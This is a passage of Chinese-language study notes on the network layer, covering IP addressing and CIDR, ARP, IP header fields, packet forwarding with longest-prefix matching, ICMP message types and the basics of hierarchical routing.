src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_xsv1tGX8bP.png"></p><p>这个 ISP 共有 64 个 C 类网络。如果不采用 CIDR 技术，则在与该 ISP 的路由器交换路由信息的每一个路由器的路由表中，就需要有 64 个项目。</p><p>但采用地址聚合后，只需用路由聚合后的 1 个项目 206.0.64.0&#x2F;18 就能找到该 ISP。&#x20;</p><h3 id="2-2-5-IP-地址的一些重要特点"><a href="#2-2-5-IP-地址的一些重要特点" class="headerlink" title="2.2.5 IP 地址的一些重要特点"></a>2.2.5 IP 地址的一些重要特点</h3><ol><li>IP 地址是一种分等级的地址结构。分两个等级的好处是：<ul><li>IP 地址管理机构在分配 IP 地址时只分配网络号，而剩下的主机号则由得到该网络号的单位自行分配。这样就方便了 IP 地址的管理。</li><li>路由器仅根据目的主机所连接的网络号来转发分组（而不考虑目的主机号），这样就可以使路由表中的项目数大幅度减少，从而减小了路由表所占的存储空间。</li></ul></li><li>实际上 IP 地址是标志一个主机（或路由器）和一条链路的接口。<ul><li>当一个主机同时连接到两个网络上时，该主机就必须同时具有两个相应的 IP 地址，其网络号 net-id 必须是不同的。这种主机称为<strong>多归属主机</strong>（multihomed host）。</li><li>由于一个路由器至少应当连接到两个网络（这样它才能将 IP 数据报从一个网络转发到另一个网络），<strong>因此一个路由器至少应当有两个不同的 IP 地址</strong>。&#x20;</li></ul></li><li>用转发器或网桥连接起来的若干个局域网仍为一个网络，因此这些局域网都具有同样的网络号 net-id。</li><li>所有分配到网络号 net-id 的网络，无论是范围很小的局域网，还是可能覆盖很大地理范围的广域网，都是平等的。</li></ol><p>举例如下：</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_dvF0FQ9uW6.png"></p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_RoQubLGVov.png"></p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_QyIa7AbmSg.png"></p><h2 id="2-3-IP地址与MAC地址"><a href="#2-3-IP地址与MAC地址" class="headerlink" title="2.3 IP地址与MAC地址"></a>2.3 IP地址与MAC地址</h2><p>MAC地址是数据链路层使用的地址，IP地址是网络层和以上各层使用的地址，是一种逻辑地址。</p><p>在发送数据时，数据从高层下到低层，IP数据包一旦交给数据链路层，就被封装成MAC帧，MAC帧在传递过程中使用的源地址和目的地址都是MAC地址。</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_n7MOfOpJHh.png"></p><p>看一个传输实例：</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_HFgWP67EB0.png"></p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_BXTDO1uX8r.png"></p><p>路由器只根据目的站的 IP 地址的网络号进行路由选择。</p><p>在 IP 层抽象的互联网上只能看到 IP 数据报，图中的  IP1→IP2  表示从源地址 IP1 到目的地址 IP2 ，两个路由器的 IP 地址并不出现在 IP 数据报的首部中。</p><p>在具体的物理网络的链路层只能看见 MAC 帧而看不见 IP 数据报。</p><p>IP层抽象的互联网屏蔽了下层很复杂的细节在抽象的网络层上讨论问题，就能够使用统一的、抽象的 IP 地址研究主机和主机或主机和路由器之间的通信。</p><p>IP地址如何转换为MAC地址？</p><h2 id="2-4-地址解析协议-ARP"><a href="#2-4-地址解析协议-ARP" class="headerlink" title="2.4 地址解析协议 ARP"></a>2.4 地址解析协议 ARP</h2><p>不管网络层使用的是什么协议，在实际网络的链路上传送数据帧时，最终还是必须使用硬件地址。&#x20;</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_Wlpbbsth07.png"></p><p>每一个主机都设有一个 ARP 高速缓存（ARP cache），里面有所在的局域网上的各主机和路由器的 IP 地址到硬件地址的映射表。</p><p>当主机 A 欲向本局域网上的某个主机 B 发送 IP 数据报时，就先在其 ARP 高速缓存中查看有无主机 B 的 IP 地址。如有，就可查出其对应的硬件地址，再将此硬件地址写入 MAC 帧，然后通过局域网将该 MAC 帧发往此硬件地址。</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_lravKK_Ese.png"></p><h3 id="2-4-1-ARP-高速缓存的作用-xD"><a href="#2-4-1-ARP-高速缓存的作用-xD" class="headerlink" title="2.4.1 ARP 高速缓存的作用&#xD;"></a>2.4.1 ARP 高速缓存的作用&#xD;</h3><ol><li>为了减少网络上的通信量，主机 A 在发送其 ARP 请求分组时，就将自己的 IP 地址到硬件地址的映射写入 ARP 请求分组。</li><li>当主机 B 收到 A 的 ARP 请求分组时，就将主机 A 的这一地址映射写入主机 B 自己的 ARP 高速缓存中。这对主机 B 以后向 A 发送数据报时就更方便了。&#x20;</li></ol><p>应当注意：</p><ol><li>ARP 是解决<strong>同一个局域网</strong>上的主机或路由器的 IP 地址和硬件地址的映射问题。</li><li>如果所要找的主机和源主机不在同一个局域网上，那么就要通过 ARP 找到一个位于本局域网上的某个路由器的硬件地址，然后把分组发送给这个路由器，让这个路由器把分组转发给下一个网络。剩下的工作就由下一个网络来做。</li></ol><p>从IP地址到硬件地址的解析是自动进行的，主机的用户对这种地址解析过程是不知道的。只要主机或路由器要和本网络上的另一个已知 IP 地址的主机或路由器进行通信，ARP 协议就会自动地将该 IP 地址解析为链路层所需要的硬件地址。 &#x20;</p><h3 id="2-4-2-使用-ARP-的四种典型情况"><a href="#2-4-2-使用-ARP-的四种典型情况" class="headerlink" title="2.4.2 使用 ARP 的四种典型情况"></a>2.4.2 使用 ARP 的四种典型情况</h3><ol><li><p>发送方是主机，要把IP数据报发送到本网络上的另一个主机。这时用 ARP 找到目的主机的硬件地址。&#x20;</p></li><li><p>发送方是主机，要把 IP 数据报发送到另一个网络上的一个主机。这时用 ARP 找到本网络上的一个路由器的硬件地址。剩下的工作由这个路由器来完成。&#x20;</p></li><li><p>发送方是路由器，要把 IP 数据报转发到本网络上的一个主机。这时用 ARP 找到目的主机的硬件地址。&#x20;</p></li><li><p>发送方是路由器，要把 IP 数据报转发到另一个网络上的一个主机。这时用 ARP 找到本网络上另一个路由器的硬件地址。剩下的工作由这个路由器来完成。</p></li></ol><h3 id="2-4-3-为什么不直接使用硬件地址进行通信？"><a href="#2-4-3-为什么不直接使用硬件地址进行通信？" class="headerlink" title="2.4.3 为什么不直接使用硬件地址进行通信？"></a>2.4.3 为什么不直接使用硬件地址进行通信？</h3><p>由于全世界存在着各式各样的网络，它们使用不同的硬件地址。要使这些异构网络能够互相通信就必须进行非常复杂的硬件地址转换工作，因此几乎是不可能的事。</p><p>连接到因特网的主机都拥有统一的 IP 地址，它们之间的通信就像连接在同一个网络上那样简单方便，因为调用 ARP 来寻找某个路由器或主机的硬件地址都是由计算机软件自动进行的，对用户来说是看不见这种调用过程的。 &#x20;</p><h2 id="2-5-IP-数据报的格式"><a href="#2-5-IP-数据报的格式" class="headerlink" title="2.5 IP 数据报的格式"></a>2.5 IP 数据报的格式</h2><p>一个 IP 数据报由首部和数据两部分组成。</p><p>首部的前一部分是固定长度，共 20 字节，是所有 IP 数据报必须具有的。在首部的固定部分的后面是一些可选字段，其长度是可变的。&#x20;</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_f1vf3a40PT.png"></p><h3 id="2-5-1-IP-数据报首部的固定部分中的各字段"><a href="#2-5-1-IP-数据报首部的固定部分中的各字段" class="headerlink" title="2.5.1 IP 数据报首部的固定部分中的各字段"></a>2.5.1 IP 数据报首部的固定部分中的各字段</h3><h4 id="2-5-1-1-版本"><a href="#2-5-1-1-版本" class="headerlink" title="2.5.1.1 版本"></a>2.5.1.1 版本</h4><p>占 4 位，指 IP 协议的版本，目前的 IP 协议版本号为 4（即 IPv4）。</p><h4 id="2-5-1-2-首部长度"><a href="#2-5-1-2-首部长度" class="headerlink" title="2.5.1.2 首部长度"></a>2.5.1.2 首部长度</h4><p>占 4 位，可表示的最大数值是 15 个单位(一个单位为 4 字节)，因此 IP 的首部长度的最大值是 60 字节。</p><h4 id="2-5-1-3-区分服务"><a href="#2-5-1-3-区分服务" class="headerlink" title="2.5.1.3 区分服务"></a>2.5.1.3 区分服务</h4><p>占 8 位，用来获得更好的服务。在旧标准中叫做服务类型，但实际上一直未被使用过。</p><p>1998 年这个字段改名为区分服务。只有在使用区分服务（DiffServe）时，这个字段才起作用。在一般的情况下都不使用这个字段。</p><h4 id="2-5-1-4-总长度"><a href="#2-5-1-4-总长度" class="headerlink" title="2.5.1.4 总长度"></a>2.5.1.4 总长度</h4><p>占 16 位，指首部和数据之和的长度，单位为字节，因此数据报的最大长度为 65535 字节。总长度必须不超过最大传送单元 MTU。</p><h4 id="2-5-1-5-标识"><a href="#2-5-1-5-标识" class="headerlink" title="2.5.1.5 标识"></a>2.5.1.5 标识</h4><p>占 16 位，它是一个计数器，用来产生数据报的标识。</p><p>相同的标识字段的值使分片后的各数据报片最后能正确地重装称为原来的数据报。</p><h4 id="2-5-1-6-标志"><a href="#2-5-1-6-标志" class="headerlink" title="2.5.1.6 标志"></a>2.5.1.6 标志</h4><p>占 3 位，目前只有前两位有意义。</p><p>标志字段的最低位是 MF (More Fragment)。</p><ul><li>MF &#x3D; 1 表示后面“还有分片”</li><li>MF &#x3D; 0 表示最后一个分片。</li></ul><p>标志字段中间的一位是 DF (Don’t Fragment) ，意思是“不能分片”，只有当 DF &#x3D; 0 时才允许分片。</p><h4 id="2-5-1-7-片偏移"><a href="#2-5-1-7-片偏移" class="headerlink" title="2.5.1.7 片偏移"></a>2.5.1.7 片偏移</h4><p>片偏移（13 位）指出：较长的分组在分片后某片在原分组中的相对位置。片偏移以 8 个字节为偏移单位。</p><p>&#x20;IP 数据报分片</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_1mJNZW2Gq_.png"></p><h4 id="2-5-1-8-生存时间"><a href="#2-5-1-8-生存时间" class="headerlink" title="2.5.1.8 生存时间"></a>2.5.1.8 生存时间</h4><p>生存时间（8 位）记为 TTL (Time To Live)，即数据报在网络中可通过的路由器数的最大值。</p><p>防止无法交付的数据报无限制地在互联网中兜圈子，每经过一个路由器时，TTL减去数据报在路由器所消耗掉的一段时间，当TTL值减小到0，就丢弃这个数据报。</p><h4 id="2-5-1-9-协议"><a href="#2-5-1-9-协议" class="headerlink" title="2.5.1.9 协议"></a>2.5.1.9 协议</h4><p>协议（8 位）字段指出此数据报携带的数据使用何种协议，以便目的主机的 IP 层将数据部分上交给哪个处理过程。</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_TokEMnWHkO.png"></p><h4 id="2-5-1-10-首部校验和"><a href="#2-5-1-10-首部校验和" class="headerlink" title="2.5.1.10 首部校验和"></a>2.5.1.10 首部校验和</h4><p>首部检验和（16 位）字段只检验数据报的首部，不检验数据部分。这里不采用 CRC 检验码而采用简单的计算方法。&#x20;</p><p>没经过一个路由器都要重新计算一下首部校验和，因此不检验数据部分可减少计算的工作量。</p><p>先将IP数据报首部划分为许多16位字的序列，用反码算术运算吧所有16位字相加后，将得到的和的反码写入检验和字段。</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_4N3p82-jCP.png"></p><p>接收方收到数据报后，把首部的所有16位字再使用反码算术运算相加一次。</p><h4 id="2-5-1-11-源地址和目的地址"><a href="#2-5-1-11-源地址和目的地址" class="headerlink" title="2.5.1.11 源地址和目的地址"></a>2.5.1.11 源地址和目的地址</h4><p>源地址和目的地址都各占 4 字节。</p><h3 id="2-5-2-IP-数据报首部的可变部分"><a href="#2-5-2-IP-数据报首部的可变部分" class="headerlink" title="2.5.2 IP 数据报首部的可变部分"></a>2.5.2 IP 数据报首部的可变部分</h3><p>IP 首部的可变部分就是一个选项字段，用来支持排错、测量以及安全等措施，内容很丰富。选项字段的长度可变，从 1 个字节到 40 个字节不等，取决于所选择的项目。</p><p>增加首部的可变部分是为了增加 IP 数据报的功能，但这同时也使得 IP 数据报的首部长度成为可变的。这就增加了每一个路由器处理数据报的开销。实际上这些选项很少被使用。</p><hr><h1 id="3-IP-层转发分组的流程"><a href="#3-IP-层转发分组的流程" class="headerlink" title="3 IP 层转发分组的流程"></a>3 IP 层转发分组的流程</h1><h2 id="3-1-基于终点的转发"><a href="#3-1-基于终点的转发" class="headerlink" title="3.1 基于终点的转发"></a>3.1 基于终点的转发</h2><p>假设有四个 A 类网络，通过三个路由器连接在一起。每一个网络上都可能会有成千上万个主机。可以想像，若按目的主机号来制作路由表，则所得出的路由表就会非常庞大。</p><p>但若按主机所在的网络地址（范围）来制作路由表，那么每一个路由器中的路由表就只包含 4 个条目。这样就可使路由表大大简化。&#x20;</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_OW_Qm6coyT.png"></p><h3 id="3-1-1-查找路由表"><a href="#3-1-1-查找路由表" class="headerlink" title="3.1.1 查找路由表"></a>3.1.1 查找路由表</h3><p>根据目的网络地址就能确定下一跳路由器，这样做的结果是：</p><ul><li>P 数据报最终一定可以找到目的主机所在目的网络上的路由器（可能要通过多次的间接交付）。</li><li>只有到达最后一个路由器时，才试图向目的主机进行直接交付。&#x20;</li></ul><h3 id="3-1-2-特定主机路由"><a href="#3-1-2-特定主机路由" class="headerlink" title="3.1.2 特定主机路由"></a>3.1.2 特定主机路由</h3><p>这种路由是为特定的目的主机指明一个路由。</p><p>采用特定主机路由可使网络管理人员能更方便地控制网络和测试网络，同时也可在需要考虑某种安全问题时采用这种特定主机路由。&#x20;</p><h3 id="3-1-3-默认路由（default-route）"><a href="#3-1-3-默认路由（default-route）" class="headerlink" title="3.1.3 默认路由（default route）"></a>3.1.3 默认路由（default route）</h3><p>路由器还可采用默认路由以减少路由表所占用的空间和搜索路由表所用的时间。这种转发方式在一个网络只有很少的对外连接时是很有用的。</p><p>默认路由在主机发送 IP 数据报时往往更能显示出它的好处。</p><p>如果一个主机连接在一个小网络上，而这个网络只用一个路由器和因特网连接，那么在这种情况下使用默认路由是非常合适的。&#x20;</p><p><strong>注意</strong>：</p><ol><li><p>IP 数据报的首部中没有地方可以用来指明“下一跳路由器的 IP 地址”。</p></li><li><p>当路由器收到待转发的数据报，不是将下一跳路由器的 IP 地址填入 IP 数据报，而是送交下层的网络接口软件。</p></li><li><p>网络接口软件使用 ARP 负责将下一跳路由器的 IP 地址转换成硬件地址，并将此硬件地址放在链路层的 MAC 帧的首部，然后根据这个硬件地址找到下一跳路由器。</p></li></ol><h3 id="3-1-4-分组转发算法"><a href="#3-1-4-分组转发算法" class="headerlink" title="3.1.4 分组转发算法"></a>3.1.4 分组转发算法</h3><ol><li><p>从数据报的首部提取目的主机的 IP 地址 D，得出目的网络地址为 N。</p></li><li><p>若网络 N 与此路由器直接相连，则把数据报直接交付目的主机 D；否则是间接交付，执行3。</p></li><li><p>若路由表中有目的地址为 D 的特定主机路由，则把数据报传送给路由表中所指明的下一跳路由器；否则，执行4。</p></li><li><p>若路由表中有到达网络 N 的路由，则把数据报传送给路由表指明的下一跳路由器；否则，执行5。</p></li><li><p>若路由表中有一个默认路由，则把数据报传送给路由表中所指明的默认路由器；否则，执行6。</p></li><li><p>报告转发分组出错。</p></li></ol><h2 id="3-2-使用子网掩码的分组转发过程"><a href="#3-2-使用子网掩码的分组转发过程" class="headerlink" title="3.2 使用子网掩码的分组转发过程"></a>3.2 使用子网掩码的分组转发过程</h2><p>在不划分子网的两级 IP 地址情况下，从 IP 地址中可直接得出其网络地址。</p><p>但在划分子网的三级 IP 地址情况下，从 IP 地址中不能直接得出其网络地址，这是因为网络地址取决于那个网络所采用的子网掩码，但数据报的首部并没有提供子网掩码的信息。因此分组转发的算法将做一些相应的改动。</p><h3 id="3-2-1-在划分子网的情况下路由器转发分组的算法"><a href="#3-2-1-在划分子网的情况下路由器转发分组的算法" class="headerlink" title="3.2.1 在划分子网的情况下路由器转发分组的算法"></a>3.2.1 在划分子网的情况下路由器转发分组的算法</h3><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_KK5pKyWLS-.png"></p><blockquote><p>例：已知互联网和路由器 R1 中的路由表。主机 H1 向 H2 发送分组。试讨论 R1 收到 H1 向 H2 发送的分组后查找路由表的过程。&#x20;</p></blockquote><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_ds1i7VWHFB.png"></p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_vV-7iJ2trr.png"></p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_2RzyUT0Gak.png"></p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_bXkfu4ZQiG.png"></p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_JmmDNE6ZZ-.png"></p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_EFu0cWddhz.png"></p><h2 id="3-3-最长前缀匹配"><a href="#3-3-最长前缀匹配" class="headerlink" title="3.3 最长前缀匹配"></a>3.3 最长前缀匹配</h2><p>使用 CIDR 时，路由表中的每个项目由“网络前缀”和“下一跳地址”组成。在查找路由表时可能会得到不止一个匹配结果。&#x20;</p><p>应当从匹配结果中选择具有最长网络前缀的路由：最长前缀匹配（longest-prefix matching）。</p><p>网络前缀越长，其地址块就越小，因而路由就越具体（more specific） 。最长前缀匹配又称为<strong>最长匹配</strong>或<strong>最佳匹配</strong>。</p><p>最长前缀匹配举例：</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_wPgkMqBz7n.png"></p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_sf-hzHUsu1.png"></p><p>应选择两个匹配的地址中更具体的一个，即选择最长前缀的地址。&#x20;</p><h3 id="3-3-1-使用二叉线索查找转发表"><a href="#3-3-1-使用二叉线索查找转发表" class="headerlink" title="3.3.1 使用二叉线索查找转发表"></a>3.3.1 使用二叉线索查找转发表</h3><p>使用CIDR之后，由于不知道目的网络的前缀，使转发表的查找过程变得更加复杂了。对于CIDR的转发表的最简单的查找算法就是对所有可能的前缀进行循环查找，从最长的前缀开始查找。</p><p>这种最简单的算法的明显缺点就是查找的次数太多，最坏的情况是转发表中没有这个路由，但是还要一直查找下去。</p><p>为了进行更加有效的查找，可以使用二叉线索来维护，二叉线索（binary trie）是一种特殊结构的树，可以快速在转发表中找到匹配的叶节点。</p><ul><li>从二叉线索的根节点自顶向下的深度最多有 32 层，每一层对应于 IP 地址中的一位。</li><li>为简化二叉线索的结构，可以用唯一前缀 (unique prefix) 来构造二叉线索。</li><li>为了提高二叉线索的查找速度，广泛使用了各种压缩技术。</li></ul><blockquote><p>规则：先检查 IP 地址左边的第一位，如为 0，则第一层的节点就在根节点的左下方；如为 1，则在右下方。然后再检查地址的第二位，构造出第二层的节点。依此类推，直到唯一前缀的最后一位。每个叶节点代表一个唯一前缀。 为检查网络前缀是否匹配，必须使二叉线索中的每一个叶节点包含所对应的网络前缀和子网掩码。</p></blockquote><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_v77ZX3rIKK.png"></p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_ZimUXw04lF.png"></p><hr><h1 id="4-网际控制报文协议ICMP"><a href="#4-网际控制报文协议ICMP" class="headerlink" title="4 网际控制报文协议ICMP"></a>4 网际控制报文协议ICMP</h1><p>为了提高 IP 数据报交付成功率，在网络层使用了网际控制报文协议 ICMP (Internet Control Message Protocol)。</p><p>ICMP 允许主机或路由器报告“差错以及有关异常情况”。ICMP 报文加上IP数据报的首部，组成 IP 数据报发送出去。（注意：ICMP和IP均为网络层的协议）&#x20;</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_xi6QLQniRU.png"></p><h2 id="4-1-ICMP-报文的种类"><a href="#4-1-ICMP-报文的种类" class="headerlink" title="4.1 ICMP 报文的种类"></a>4.1 ICMP 报文的种类</h2><p>ICMP 报文的种类有两种，即</p><ol><li>ICMP 差错报告报文</li><li>ICMP 询问报文</li></ol><p>ICMP 报文的前 4 个字节共有三个字段：即类型、代码和检验和，接着的 4 个字节内容与 ICMP 类型有关。&#x20;</p><h3 id="4-1-1-ICMP-差错报告报文共有-5-种"><a href="#4-1-1-ICMP-差错报告报文共有-5-种" class="headerlink" title="4.1.1 ICMP 差错报告报文共有 5 种"></a>4.1.1 ICMP 差错报告报文共有 5 种</h3><ul><li><strong>终点不可达</strong></li><li><strong>时间超过</strong></li><li><strong>参数问题</strong>：路由器或目的主机收到的数据报的首部中有的字段的值不正确</li><li><strong>改变路由</strong>（重定向）(Redirect)  ：找到了更好的路由</li></ul><h3 id="4-1-2-ICMP-询问报文有两种"><a href="#4-1-2-ICMP-询问报文有两种" class="headerlink" title="4.1.2 ICMP 询问报文有两种"></a>4.1.2 ICMP 询问报文有两种</h3><ul><li>送请求报文（及回送请求答复报文）</li><li>时间戳请求报文（及时间戳请求答复报文）</li></ul><p>下面的几种 ICMP 报文不再使用：</p><ul><li>信息请求报文与答复报文</li><li>掩码地址请求和答复报文</li><li>路由器询问报文和通告报文&#x20;</li></ul><h2 id="4-2-ICMP-差错报告报文的数据字段的内容"><a href="#4-2-ICMP-差错报告报文的数据字段的内容" class="headerlink" title="4.2 ICMP 差错报告报文的数据字段的内容"></a>4.2 ICMP 差错报告报文的数据字段的内容</h2><p>所有的ICMP差错报告报文中的数据字段都具有相同的格式，把收到的需要进行差错报告的IP数据报的首部和数据字段的前８个字节提取出来，作为ICMP报文的数据字段。</p><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_aaIM9q6mWw.png"></p><h2 id="4-3-不应发送-ICMP-差错报告报文的-4-种情况"><a href="#4-3-不应发送-ICMP-差错报告报文的-4-种情况" class="headerlink" title="4.3 不应发送 ICMP 差错报告报文的 4 种情况"></a>4.3 不应发送 ICMP 差错报告报文的 4 种情况</h2><ol><li><p>对 ICMP 差错报告报文不再发送 ICMP 差错报告报文</p></li><li><p>对第一个分片的数据报片的所有后续数据报片都不发送 ICMP 差错报告报文。（IP数据报首部中“偏移量”字段）</p></li><li><p>对具有多播地址的数据报都不发送 ICMP 差错报告报文</p></li><li><p>对具有特殊地址（如127.0.0.0 或 0.0.0.0）的数据报不发送 ICMP 差错报告报文</p></li></ol><hr><h1 id="5-路由选择协议"><a href="#5-路由选择协议" class="headerlink" title="5 路由选择协议"></a>5 路由选择协议</h1><h2 id="5-1-有关路由选择协议的几个基本概念"><a href="#5-1-有关路由选择协议的几个基本概念" class="headerlink" title="5.1 有关路由选择协议的几个基本概念"></a>5.1 有关路由选择协议的几个基本概念</h2><h3 id="5-1-1-理想的路由算法"><a href="#5-1-1-理想的路由算法" class="headerlink" title="5.1.1 理想的路由算法"></a>5.1.1 理想的路由算法</h3><ol><li><p>算法必须是正确的和完整的。&#x20;</p></li><li><p>算法在计算上应简单。&#x20;</p></li><li><p>算法应能适应通信量和网络拓扑的变化，这就是说，要有自适应性。&#x20;</p></li><li><p>算法应具有稳定性。&#x20;</p></li><li><p>算法应是公平的。&#x20;</p></li><li><p>算法应是最佳的。&#x20;</p></li></ol><p>不存在一种绝对的最佳路由算法。所谓“最佳”只能是相对于某一种特定要求下得出的较为合理的选择而已。实际的路由选择算法，应尽可能接近于理想的算法。&#x20;</p><p>路由选择是个非常复杂的问题它是网络中的所有结点共同协调工作的结果。路由选择的环境往往是不断变化的，而这种变化有时无法事先知道。 &#x20;</p><p><strong>从路由算法的自适应性考虑</strong></p><ul><li><strong>静态路由选择策略</strong>——即非自适应路由选择，其特点是简单和开销较小，但不能及时适应网络状态的变化。&#x20;</li><li><strong>动态路由选择策略</strong>——即自适应路由选择，其特点是能较好地适应网络状态的变化，但实现起来较为复杂，开销也比较大。 &#x20;</li></ul><h3 id="5-1-2-分层次的路由选择协议-xD"><a href="#5-1-2-分层次的路由选择协议-xD" class="headerlink" title="5.1.2 分层次的路由选择协议&#xD;"></a>5.1.2 分层次的路由选择协议&#xD;</h3><p>因特网采用分层次的路由选择协议。</p><p>因特网的规模非常大。如果让所有的路由器知道所有的网络应怎样到达，则这种路由表将非常大，处理起来也太花时间。而所有这些路由器之间交换路由信息所需的带宽就会使因特网的通信链路饱和。</p><p>许多单位不愿意外界了解自己单位网络的布局细节和本部门所采用的路由选择协议（这属于本部门内部的事情），但同时还希望连接到因特网上。  &#x20;</p><p>因此把互联网划分为许多较小的自治系统（Autonomous System） 。</p><p>自治系统是在单一的技术管理下的一组路由器，而这些路由器使用一种 AS 内部的路由选择协议和共同的度量以确定分组在该 AS 内的路由，同时还使用一种 AS 之间的路由选择协议用以确定分组在 AS之间的路由。</p><p>现在对自治系统 AS 的定义是强调下面的事实：尽管一个 AS 使用了多种内部路由选择协议和度量，但重要的是一个 AS 对其他 AS 表现出的是一个单一的和一致的路由选择策略。</p><p>这样就把互联网的路由选择协议划分位两大类：</p><ol><li><p><strong>内部网关协议 IGP</strong>（Interior Gateway Protocol）</p><p>即在一个自治系统内部使用的路由选择协议。目前这类路由选择协议使用得最多，如 RIP 和 OSPF 协议。</p></li><li><p><strong>外部网关协议EGP</strong>（External Gateway Protocol）</p><p>若源站和目的站处在不同的自治系统中，当数据报传到一个自治系统的边界时，就需要使用一种协议将路由选择信息传递到另一个自治系统中。这样的协议就是外部网关协议 EGP。在外部网关协议中目前使用最多的是 BGP-4。</p></li></ol><p><img src="/2024/06/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C%E7%AC%AC4%E7%AB%A0%EF%BC%9A%E7%BD%91%E7%BB%9C%E5%B1%82/image_pPZMp75j-b.png"></p><ul><li>自治系统之间的路由选择也叫做<strong>域间路由选择</strong>（interdomain 